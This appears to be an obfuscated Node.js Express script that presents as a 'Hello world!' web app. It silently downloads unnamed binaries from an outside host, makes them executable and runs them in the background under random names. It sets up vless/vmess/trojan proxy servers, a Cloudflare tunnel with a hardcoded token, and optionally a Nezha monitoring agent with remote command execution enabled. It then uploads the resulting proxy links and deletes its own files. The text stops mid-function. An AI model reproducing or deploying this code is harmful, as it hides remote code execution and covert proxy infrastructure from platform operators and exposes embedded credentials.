const _0x56ee8b=_0x39c9;(function(_0xa9dda8,_0xe7ccc1){const _0x50ee63=_0x39c9,_0x180a5d=_0xa9dda8();while(!![]){try{const _0xe66af=-parseInt(_0x50ee63(0x223))/0x1*(parseInt(_0x50ee63(0x203))/0x2)+-parseInt(_0x50ee63(0x200))/0x3+-parseInt(_0x50ee63(0x2a1))/0x4*(parseInt(_0x50ee63(0x282))/0x5)+parseInt(_0x50ee63(0x248))/0x6*(-parseInt(_0x50ee63(0x1e3))/0x7)+-parseInt(_0x50ee63(0x241))/0x8+parseInt(_0x50ee63(0x271))/0x9+parseInt(_0x50ee63(0x284))/0xa;if(_0xe66af===_0xe7ccc1)break;else _0x180a5d['push'](_0x180a5d['shift']());}catch(_0x2a53c6){_0x180a5d['push'](_0x180a5d['shift']());}}}(_0x1fad,0xebeab));const _0x238cf7=(function(){let _0x5a3753=!![];return function(_0x3a8ecf,_0x5b46b7){const _0x5ee8d4=_0x5a3753?function(){if(_0x5b46b7){const _0x1e3b9c=_0x5b46b7['apply'](_0x3a8ecf,arguments);return _0x5b46b7=null,_0x1e3b9c;}}:function(){};return _0x5a3753=![],_0x5ee8d4;};}()),_0x37f696=_0x238cf7(this,function(){const _0x1fb5d5=_0x39c9;return _0x37f696[_0x1fb5d5(0x2a0)]()[_0x1fb5d5(0x214)](_0x1fb5d5(0x20e))[_0x1fb5d5(0x2a0)]()[_0x1fb5d5(0x25c)](_0x37f696)['search'](_0x1fb5d5(0x20e));});_0x37f696();const _0x2e5394=(function(){let _0x21ae9b=!![];return function(_0x400023,_0x1e05e0){const _0x56ac4a=_0x21ae9b?function(){const _0x30c123=_0x39c9;if(_0x1e05e0){const _0x2c6f3a=_0x1e05e0[_0x30c123(0x28c)](_0x400023,arguments);return _0x1e05e0=null,_0x2c6f3a;}}:function(){};return _0x21ae9b=![],_0x56ac4a;};}()),_0x4af046=_0x2e5394(this,function(){const _0x37e1cf=_0x39c9,_0x1845d9=function(){const _0xd8d811=_0x39c9;let _0x28eb82;try{_0x28eb82=Function(_0xd8d811(0x1e1)+_0xd8d811(0x296)+');')();}catch(_0x34a065){_0x28eb82=window;}return _0x28eb82;},_0xed9eec=_0x1845d9(),_0x197e8a=_0xed9eec[_0x37e1cf(0x298)]=_0xed9eec['console']||{},_0x3e9ecc=[_0x37e1cf(0x234),'warn','info',_0x37e1cf(0x257),_0x37e1cf(0x279),'table','trace'];for(let _0x449af3=0x0;_0x449af3<_0x3e9ecc[_0x37e1cf(0x232)];_0x449af3++){const _0xaacfd=_0x2e5394[_0x37e1cf(0x25c)]['prototype'][_0x37e1cf(0x1f5)](_0x2e5394),_0x2d9684=_0x3e9ecc[_0x449af3],_0x56f96e=_0x197e8a[_0x2d9684]||_0xaacfd;_0xaacfd[_0x37e1cf(0x276)]=_0x2e5394[_0x37e1cf(0x1f5)](_0x2e5394),_0xaacfd[_0x37e1cf(0x2a0)]=_0x56f96e[_0x37e1cf(0x2a0)]['bind'](_0x56f96e),_0x197e8a[_0x2d9684]=_0xaacfd;}});function _0x39c9(_0x28c883,_0x17de4d){_0x28c883=_0x28c883-0x1df;const _0xb4d00b=_0x1fad();let _0x4af046=_0xb4d00b[_0x28c883];return _0x4af046;}_0x4af046();const express=require(_0x56ee8b(0x1ea)),app=express(),axios=require(_0x56ee8b(0x21b)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x56ee8b(0x27c)),exec=promisify(require(_0x56ee8b(0x293))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x56ee8b(0x1f8)][_0x56ee8b(0x208)]||'',PROJECT_URL=process[_0x56ee8b(0x1f8)][_0x56ee8b(0x292)]||'',AUTO_ACCESS=process[_0x56ee8b(0x1f8)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x56ee8b(0x1f8)][_0x56ee8b(0x222)]||_0x56ee8b(0x20d),SUB_PATH=process[_0x56ee8b(0x1f8)]['SUB_PATH']||_0x56ee8b(0x225),PORT=process[_0x56ee8b(0x1f8)][_0x56ee8b(0x1eb)]||process['env'][_0x56ee8b(0x29b)]||0xbb8,UUID=process[_0x56ee8b(0x1f8)][_0x56ee8b(0x226)]||'a97fc05f-0876-4e28-9697-f522175cf08e',NEZHA_SERVER=process['env'][_0x56ee8b(0x28f)]||'',NEZHA_PORT=process['env'][_0x56ee8b(0x1ef)]||'',NEZHA_KEY=process[_0x56ee8b(0x1f8)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x56ee8b(0x1f8)][_0x56ee8b(0x204)]||'peakcs.lian502.dpdns.org',ARGO_AUTH=process[_0x56ee8b(0x1f8)]['ARGO_AUTH']||'eyJhIjoiNjAyMDVjMzUyZGFmYThiNGQ2YmI0MjdjMGUyNTZkNWMiLCJ0IjoiNWZlZDY3Y2MtM2UxZi00NmQ2LThmN2EtMjU2OWNhMzBhYWQ1IiwicyI6IllqUmxaR1ExWTJZdE16QmpOUzAwTlRjMkxXSXlOMlV0TVdJeVltVXhOek5oTnpCbCJ9',ARGO_PORT=process['env']['ARGO_PORT']||0xc800,CFIP=process[_0x56ee8b(0x1f8)]['CFIP']||_0x56ee8b(0x289),CFPORT=process['env'][_0x56ee8b(0x270)]||0x1bb,NAME=process['env'][_0x56ee8b(0x258)]||_0x56ee8b(0x22a);!fs['existsSync'](FILE_PATH)?(fs[_0x56ee8b(0x287)](FILE_PATH),console[_0x56ee8b(0x234)](FILE_PATH+'\x20is\x20created')):console[_0x56ee8b(0x234)](FILE_PATH+_0x56ee8b(0x213));function generateRandomName(){const _0x3e5fe1=_0x56ee8b,_0x38bed7=_0x3e5fe1(0x20c);let _0x423dec='';for(let _0x4e5f45=0x0;_0x4e5f45<0x6;_0x4e5f45++){_0x423dec+=_0x38bed7['charAt'](Math[_0x3e5fe1(0x1e2)](Math[_0x3e5fe1(0x29e)]()*_0x38bed7[_0x3e5fe1(0x232)]));}return _0x423dec;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x56ee8b(0x202)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x56ee8b(0x202)](FILE_PATH,webName),botPath=path[_0x56ee8b(0x202)](FILE_PATH,botName),subPath=path[_0x56ee8b(0x202)](FILE_PATH,_0x56ee8b(0x28a)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x56ee8b(0x202)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function _0x1fad(){const _0x44ea85=['CFPORT','16124058caGNCr','\x22\x20>\x20/dev/null\x202>&1','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20is\x20running','8443','__proto__','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','stringify','exception','ArgoDomain:','catch','util','/dev/null','\x0a\x20\x20\x20\x20','/sub.txt\x20saved\x20successfully','message','post','5iTjgBM','https://arm64.ssss.nyc.mn/v1','51046220DCwlMr','win32','rm\x20-rf\x20','mkdirSync','\x20-p\x20','cdns.doon.eu.org','sub.txt','arm','apply','/api/add-nodes','isFile','NEZHA_SERVER','unlink','base64','PROJECT_URL','child_process','text/plain;\x20charset=utf-8','\x20>\x20nul\x202>&1','{}.constructor(\x22return\x20this\x22)(\x20)','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','console','https://arm64.ssss.nyc.mn/agent','/api/delete-nodes','PORT','\x0a\x20\x20credentials-file:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','random','/api/add-subscriptions','toString','6561300UGOLGk','https://arm64.ssss.nyc.mn/web','Skipping\x20adding\x20automatic\x20access\x20task','readdirSync','Error\x20executing\x20command:\x20','tunnel.json','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','return\x20(function()\x20','floor','4552212zEMdSF','substring','config.json','then','App\x20is\x20running','direct','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','express','SERVER_PORT','existsSync','Empowerment\x20failed\x20for\x20','127.0.0.1','NEZHA_PORT','Empowerment\x20success\x20for\x20','2087','/tunnel.yml\x20run','filter','aarch64','bind','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','send','env','basename','npm\x20running\x20error:\x20','block','charAt','quic','.exe\x20>\x20nul\x202>&1','match','3711966FcTxCL','https://arm64.ssss.nyc.mn/bot','join','2ibuBul','ARGO_DOMAIN','\x20-c\x20','tunnel.yml','Subscription\x20uploaded\x20successfully','UPLOAD_URL','amd','fileName','clear','abcdefghijklmnopqrstuvwxyz','./tmp','(((.+)+)+)+$','Error\x20in\x20startserver:','Nodes\x20uploaded\x20successfully','trim','https://amd64.ssss.nyc.mn/agent','\x20already\x20exists','search','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','writeFileSync','split','2096','\x0avless://','from','axios','response','\x0a\x20\x20\x0atrojan://','unlinkSync','xtls-rprx-vision','http\x20server\x20is\x20running\x20on\x20port:','includes','FILE_PATH','55675DFMwTK','map','zmkm','UUID','statSync','tcp','trojan','lianpeakcs','--tls','set','pkill\x20-f\x20\x22[','arch','arm64','\x0aclient_secret:\x20','443','length','nohup\x20','log','automatic\x20access\x20task\x20added\x20successfully','https://amd64.ssss.nyc.mn/web','unshift','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','forEach','push','freedom','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tls','Download\x20','\x20-s\x20','finish','13567320opRHJI','application/json','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','https+local://8.8.8.8/dns-query','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','boot.log','status','12ZMQOTy','del\x20/f\x20/q\x20','2083','taskkill\x20/f\x20/im\x20','none','https://amd64.ssss.nyc.mn/bot','?security=tls&sni=','Error\x20reading\x20boot.log:','utf-8','TunnelSecret','http','https://amd64.ssss.nyc.mn/v1','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','web\x20running\x20error:\x20','error','NAME','2053','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','&fp=firefox&type=ws&host=','constructor','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','get','\x20successfully','test','readFileSync','false','\x20>/dev/null\x202>&1\x20&','all','blackhole','vless','firefox','/vless-argo','chmod','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20-c\x20\x22','vmess','pipe','/vmess-argo','\x20failed:\x20'];_0x1fad=function(){return _0x44ea85;};return _0x1fad();}function deleteNodes(){const _0x34354b=_0x56ee8b;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x53a701;try{_0x53a701=fs[_0x34354b(0x261)](subPath,'utf-8');}catch{return null;}const _0x2aa0cc=Buffer[_0x34354b(0x21a)](_0x53a701,'base64')[_0x34354b(0x2a0)]('utf-8'),_0x585e28=_0x2aa0cc['split']('\x0a')[_0x34354b(0x1f3)](_0x4742e0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x34354b(0x260)](_0x4742e0));if(_0x585e28['length']===0x0)return;return axios[_0x34354b(0x281)](UPLOAD_URL+_0x34354b(0x29a),JSON[_0x34354b(0x278)]({'nodes':_0x585e28}),{'headers':{'Content-Type':_0x34354b(0x242)}})['catch'](_0x2acd72=>{return null;}),null;}catch(_0x453af0){return null;}}function cleanupOldFiles(){const _0x3ec22e=_0x56ee8b;try{const _0x4de440=fs[_0x3ec22e(0x2a4)](FILE_PATH);_0x4de440[_0x3ec22e(0x239)](_0x5d9b85=>{const _0x32a0a2=_0x3ec22e,_0x44fad7=path[_0x32a0a2(0x202)](FILE_PATH,_0x5d9b85);try{const _0x19a629=fs[_0x32a0a2(0x227)](_0x44fad7);_0x19a629[_0x32a0a2(0x28e)]()&&fs[_0x32a0a2(0x21e)](_0x44fad7);}catch(_0x51721f){}});}catch(_0x25faf4){}}app[_0x56ee8b(0x25e)]('/',function(_0x29dae6,_0x2c6929){const _0x45e935=_0x56ee8b;_0x2c6929[_0x45e935(0x1f7)]('Hello\x20world!');});async function generateConfig(){const _0x5827fb=_0x56ee8b,_0x172614={'log':{'access':_0x5827fb(0x27d),'error':_0x5827fb(0x27d),'loglevel':_0x5827fb(0x24c)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5827fb(0x266),'settings':{'clients':[{'id':UUID,'flow':_0x5827fb(0x21f)}],'decryption':_0x5827fb(0x24c),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x5827fb(0x26e),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x5827fb(0x228)}},{'port':0xbb9,'listen':_0x5827fb(0x1ee),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x5827fb(0x24c)},'streamSettings':{'network':_0x5827fb(0x228),'security':_0x5827fb(0x24c)}},{'port':0xbba,'listen':_0x5827fb(0x1ee),'protocol':_0x5827fb(0x266),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5827fb(0x24c)},'streamSettings':{'network':'ws','security':_0x5827fb(0x24c),'wsSettings':{'path':_0x5827fb(0x268)}},'sniffing':{'enabled':!![],'destOverride':[_0x5827fb(0x252),_0x5827fb(0x23d),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5827fb(0x26c),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5827fb(0x26e)}},'sniffing':{'enabled':!![],'destOverride':[_0x5827fb(0x252),_0x5827fb(0x23d),_0x5827fb(0x1fd)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x5827fb(0x229),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5827fb(0x24c),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5827fb(0x252),_0x5827fb(0x23d),_0x5827fb(0x1fd)],'metadataOnly':![]}}],'dns':{'servers':[_0x5827fb(0x244)]},'outbounds':[{'protocol':_0x5827fb(0x23b),'tag':_0x5827fb(0x1e8)},{'protocol':_0x5827fb(0x265),'tag':_0x5827fb(0x1fb)}]};fs[_0x5827fb(0x216)](path['join'](FILE_PATH,_0x5827fb(0x1e5)),JSON[_0x5827fb(0x278)](_0x172614,null,0x2));}function getSystemArchitecture(){const _0x12a11e=_0x56ee8b,_0x1692de=os[_0x12a11e(0x22e)]();return _0x1692de===_0x12a11e(0x28b)||_0x1692de===_0x12a11e(0x22f)||_0x1692de===_0x12a11e(0x1f4)?_0x12a11e(0x28b):_0x12a11e(0x209);}function downloadFile(_0x5b5638,_0x13066d,_0x1550fa){const _0x382a57=_0x56ee8b,_0x772fd3=_0x5b5638;!fs[_0x382a57(0x1ec)](FILE_PATH)&&fs[_0x382a57(0x287)](FILE_PATH,{'recursive':!![]});const _0x266d3b=fs['createWriteStream'](_0x772fd3);axios({'method':_0x382a57(0x25e),'url':_0x13066d,'responseType':'stream'})[_0x382a57(0x1e6)](_0x36b7be=>{const _0x14292a=_0x382a57;_0x36b7be['data'][_0x14292a(0x26d)](_0x266d3b),_0x266d3b['on'](_0x14292a(0x240),()=>{const _0x3da4f8=_0x14292a;_0x266d3b['close'](),console[_0x3da4f8(0x234)](_0x3da4f8(0x23e)+path[_0x3da4f8(0x1f9)](_0x772fd3)+_0x3da4f8(0x25f)),_0x1550fa(null,_0x772fd3);}),_0x266d3b['on'](_0x14292a(0x257),_0x3204f1=>{const _0x2e5a70=_0x14292a;fs[_0x2e5a70(0x290)](_0x772fd3,()=>{});const _0x52f705=_0x2e5a70(0x23e)+path[_0x2e5a70(0x1f9)](_0x772fd3)+_0x2e5a70(0x26f)+_0x3204f1[_0x2e5a70(0x280)];console[_0x2e5a70(0x257)](_0x52f705),_0x1550fa(_0x52f705);});})[_0x382a57(0x27b)](_0x5bbf8e=>{const _0x1587e1=_0x382a57,_0x4916d7=_0x1587e1(0x23e)+path['basename'](_0x772fd3)+_0x1587e1(0x26f)+_0x5bbf8e[_0x1587e1(0x280)];console[_0x1587e1(0x257)](_0x4916d7),_0x1550fa(_0x4916d7);});}async function downloadFilesAndRun(){const _0x2c9616=_0x56ee8b,_0x4e545e=getSystemArchitecture(),_0x35df75=getFilesForArchitecture(_0x4e545e);if(_0x35df75['length']===0x0){console[_0x2c9616(0x234)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x5366aa=_0x35df75[_0x2c9616(0x224)](_0x3f0791=>{return new Promise((_0x5f1d1d,_0x4e8624)=>{const _0x54e9ef=_0x39c9;downloadFile(_0x3f0791[_0x54e9ef(0x20a)],_0x3f0791['fileUrl'],(_0x10c369,_0xacbcd7)=>{_0x10c369?_0x4e8624(_0x10c369):_0x5f1d1d(_0xacbcd7);});});});try{await Promise[_0x2c9616(0x264)](_0x5366aa);}catch(_0x554e87){console[_0x2c9616(0x257)]('Error\x20downloading\x20files:',_0x554e87);return;}function _0x409f00(_0x59165a){const _0x20b8fe=_0x2c9616,_0x28397b=0x1fd;_0x59165a[_0x20b8fe(0x239)](_0x5c8433=>{const _0x4648a0=_0x20b8fe;fs['existsSync'](_0x5c8433)&&fs[_0x4648a0(0x269)](_0x5c8433,_0x28397b,_0x342585=>{const _0x14197d=_0x4648a0;_0x342585?console['error'](_0x14197d(0x1ed)+_0x5c8433+':\x20'+_0x342585):console[_0x14197d(0x234)](_0x14197d(0x1f0)+_0x5c8433+':\x20'+_0x28397b[_0x14197d(0x2a0)](0x8));});});}const _0x2611f8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x409f00(_0x2611f8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2997be=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2c9616(0x217)](':')['pop']():'',_0x346781=new Set([_0x2c9616(0x231),_0x2c9616(0x275),_0x2c9616(0x218),_0x2c9616(0x1f1),_0x2c9616(0x24a),_0x2c9616(0x259)]),_0x2e32e6=_0x346781['has'](_0x2997be)?'true':_0x2c9616(0x262),_0x53b03c=_0x2c9616(0x230)+NEZHA_KEY+_0x2c9616(0x297)+NEZHA_SERVER+_0x2c9616(0x245)+_0x2e32e6+_0x2c9616(0x25d)+UUID;fs[_0x2c9616(0x216)](path['join'](FILE_PATH,'config.yaml'),_0x53b03c);const _0x1ac46d='nohup\x20'+phpPath+_0x2c9616(0x26b)+FILE_PATH+_0x2c9616(0x255);try{await exec(_0x1ac46d),console['log'](phpName+_0x2c9616(0x274)),await new Promise(_0x4efd58=>setTimeout(_0x4efd58,0x3e8));}catch(_0x5949dd){console[_0x2c9616(0x257)]('php\x20running\x20error:\x20'+_0x5949dd);}}else{let _0x738453='';const _0xed0301=['443','8443',_0x2c9616(0x218),_0x2c9616(0x1f1),_0x2c9616(0x24a),_0x2c9616(0x259)];_0xed0301[_0x2c9616(0x221)](NEZHA_PORT)&&(_0x738453=_0x2c9616(0x22b));const _0x38e98b='nohup\x20'+npmPath+_0x2c9616(0x23f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2c9616(0x288)+NEZHA_KEY+'\x20'+_0x738453+_0x2c9616(0x215);try{await exec(_0x38e98b),console[_0x2c9616(0x234)](npmName+_0x2c9616(0x274)),await new Promise(_0x551e67=>setTimeout(_0x551e67,0x3e8));}catch(_0x5c3280){console[_0x2c9616(0x257)](_0x2c9616(0x1fa)+_0x5c3280);}}}else console[_0x2c9616(0x234)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x296b04='nohup\x20'+webPath+_0x2c9616(0x205)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x296b04),console[_0x2c9616(0x234)](webName+_0x2c9616(0x274)),await new Promise(_0x8ab403=>setTimeout(_0x8ab403,0x3e8));}catch(_0x23b133){console[_0x2c9616(0x257)](_0x2c9616(0x256)+_0x23b133);}if(fs[_0x2c9616(0x1ec)](botPath)){let _0x22c237;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x22c237=_0x2c9616(0x29d)+ARGO_AUTH;else ARGO_AUTH[_0x2c9616(0x1ff)](/TunnelSecret/)?_0x22c237=_0x2c9616(0x1e0)+FILE_PATH+_0x2c9616(0x1f2):_0x22c237='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2c9616(0x273)+ARGO_PORT;try{await exec(_0x2c9616(0x233)+botPath+'\x20'+_0x22c237+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x2c9616(0x274)),await new Promise(_0x2e26b2=>setTimeout(_0x2e26b2,0x7d0));}catch(_0x1e3b8f){console[_0x2c9616(0x257)](_0x2c9616(0x2a5)+_0x1e3b8f);}}await new Promise(_0x9e930=>setTimeout(_0x9e930,0x1388));}function getFilesForArchitecture(_0x38bc94){const _0xb35deb=_0x56ee8b;let _0x204337;_0x38bc94===_0xb35deb(0x28b)?_0x204337=[{'fileName':webPath,'fileUrl':_0xb35deb(0x2a2)},{'fileName':botPath,'fileUrl':_0xb35deb(0x201)}]:_0x204337=[{'fileName':webPath,'fileUrl':_0xb35deb(0x236)},{'fileName':botPath,'fileUrl':_0xb35deb(0x24d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x14ee0c=_0x38bc94==='arm'?_0xb35deb(0x299):_0xb35deb(0x212);_0x204337[_0xb35deb(0x237)]({'fileName':npmPath,'fileUrl':_0x14ee0c});}else{const _0x259b01=_0x38bc94==='arm'?_0xb35deb(0x283):_0xb35deb(0x253);_0x204337[_0xb35deb(0x237)]({'fileName':phpPath,'fileUrl':_0x259b01});}}return _0x204337;}function argoType(){const _0x33b190=_0x56ee8b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x33b190(0x234)](_0x33b190(0x23c));return;}if(ARGO_AUTH[_0x33b190(0x221)](_0x33b190(0x251))){fs[_0x33b190(0x216)](path[_0x33b190(0x202)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x40395a='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x33b190(0x217)]('\x22')[0xb]+_0x33b190(0x29c)+path[_0x33b190(0x202)](FILE_PATH,_0x33b190(0x1df))+_0x33b190(0x277)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x33b190(0x25a);fs[_0x33b190(0x216)](path['join'](FILE_PATH,_0x33b190(0x206)),_0x40395a);}else console[_0x33b190(0x234)](_0x33b190(0x1f6));}argoType();async function extractDomains(){const _0x48ecd7=_0x56ee8b;let _0x277db1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x277db1=ARGO_DOMAIN,console[_0x48ecd7(0x234)]('ARGO_DOMAIN:',_0x277db1),await _0x35228a(_0x277db1);else try{const _0x548ab0=fs[_0x48ecd7(0x261)](path[_0x48ecd7(0x202)](FILE_PATH,_0x48ecd7(0x246)),_0x48ecd7(0x250)),_0x33e750=_0x548ab0[_0x48ecd7(0x217)]('\x0a'),_0x56f357=[];_0x33e750['forEach'](_0x401308=>{const _0x178c02=_0x48ecd7,_0x425a9e=_0x401308[_0x178c02(0x1ff)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x425a9e){const _0x4d8f1d=_0x425a9e[0x1];_0x56f357[_0x178c02(0x23a)](_0x4d8f1d);}});if(_0x56f357[_0x48ecd7(0x232)]>0x0)_0x277db1=_0x56f357[0x0],console['log'](_0x48ecd7(0x27a),_0x277db1),await _0x35228a(_0x277db1);else{console[_0x48ecd7(0x234)](_0x48ecd7(0x1e9)),fs[_0x48ecd7(0x21e)](path[_0x48ecd7(0x202)](FILE_PATH,'boot.log'));async function _0x3ca1c0(){const _0x15f05a=_0x48ecd7;try{process['platform']===_0x15f05a(0x285)?await exec(_0x15f05a(0x24b)+botName+_0x15f05a(0x1fe)):await exec(_0x15f05a(0x22d)+botName[_0x15f05a(0x1fc)](0x0)+']'+botName[_0x15f05a(0x1e4)](0x1)+_0x15f05a(0x272));}catch(_0x2ade14){}}_0x3ca1c0(),await new Promise(_0x308899=>setTimeout(_0x308899,0xbb8));const _0xdd840d=_0x48ecd7(0x238)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xdd840d+_0x48ecd7(0x263)),console['log'](botName+_0x48ecd7(0x274)),await new Promise(_0x5e6e36=>setTimeout(_0x5e6e36,0xbb8)),await extractDomains();}catch(_0x37ade3){console[_0x48ecd7(0x257)](_0x48ecd7(0x2a5)+_0x37ade3);}}}catch(_0x25a256){console[_0x48ecd7(0x257)](_0x48ecd7(0x24f),_0x25a256);}async function _0x35228a(_0x45b820){const _0x1752f6=_0x48ecd7,_0x5108c8=execSync(_0x1752f6(0x254),{'encoding':_0x1752f6(0x250)}),_0x42b6d0=_0x5108c8[_0x1752f6(0x211)](),_0x51ab4a=NAME?NAME+'-'+_0x42b6d0:_0x42b6d0;return new Promise(_0x2b13e0=>{setTimeout(()=>{const _0x49e109=_0x39c9,_0x535969={'v':'2','ps':''+_0x51ab4a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x49e109(0x24c),'net':'ws','type':'none','host':_0x45b820,'path':'/vmess-argo?ed=2560','tls':_0x49e109(0x23d),'sni':_0x45b820,'alpn':'','fp':_0x49e109(0x267)},_0x5dc534=_0x49e109(0x219)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x45b820+'&fp=firefox&type=ws&host='+_0x45b820+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x51ab4a+'\x0a\x20\x20\x0avmess://'+Buffer[_0x49e109(0x21a)](JSON['stringify'](_0x535969))[_0x49e109(0x2a0)](_0x49e109(0x291))+_0x49e109(0x21d)+UUID+'@'+CFIP+':'+CFPORT+_0x49e109(0x24e)+_0x45b820+_0x49e109(0x25b)+_0x45b820+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x51ab4a+_0x49e109(0x27e);console['log'](Buffer[_0x49e109(0x21a)](_0x5dc534)[_0x49e109(0x2a0)](_0x49e109(0x291))),fs[_0x49e109(0x216)](subPath,Buffer['from'](_0x5dc534)[_0x49e109(0x2a0)](_0x49e109(0x291))),console[_0x49e109(0x234)](FILE_PATH+_0x49e109(0x27f)),uploadNodes(),app[_0x49e109(0x25e)]('/'+SUB_PATH,(_0x55f7b5,_0x14530d)=>{const _0x335428=_0x49e109,_0x3a0683=Buffer['from'](_0x5dc534)['toString'](_0x335428(0x291));_0x14530d[_0x335428(0x22c)]('Content-Type',_0x335428(0x294)),_0x14530d['send'](_0x3a0683);}),_0x2b13e0(_0x5dc534);},0x7d0);});}}async function uploadNodes(){const _0x452b96=_0x56ee8b;if(UPLOAD_URL&&PROJECT_URL){const _0xa08cba=PROJECT_URL+'/'+SUB_PATH,_0x399461={'subscription':[_0xa08cba]};try{const _0xb9cb21=await axios['post'](UPLOAD_URL+_0x452b96(0x29f),_0x399461,{'headers':{'Content-Type':_0x452b96(0x242)}});return _0xb9cb21&&_0xb9cb21[_0x452b96(0x247)]===0xc8?(console['log'](_0x452b96(0x207)),_0xb9cb21):null;}catch(_0x593785){if(_0x593785[_0x452b96(0x21c)]){if(_0x593785['response'][_0x452b96(0x247)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x452b96(0x1ec)](listPath))return;const _0x472a7b=fs[_0x452b96(0x261)](listPath,_0x452b96(0x250)),_0x448fb1=_0x472a7b[_0x452b96(0x217)]('\x0a')[_0x452b96(0x1f3)](_0x3d09d0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x452b96(0x260)](_0x3d09d0));if(_0x448fb1[_0x452b96(0x232)]===0x0)return;const _0x319782=JSON['stringify']({'nodes':_0x448fb1});try{const _0x5c4ff8=await axios[_0x452b96(0x281)](UPLOAD_URL+_0x452b96(0x28d),_0x319782,{'headers':{'Content-Type':_0x452b96(0x242)}});return _0x5c4ff8&&_0x5c4ff8['status']===0xc8?(console[_0x452b96(0x234)](_0x452b96(0x210)),_0x5c4ff8):null;}catch(_0x2b9122){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x37c5a4=_0x39c9,_0x5d4e70=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5d4e70['push'](npmPath);else 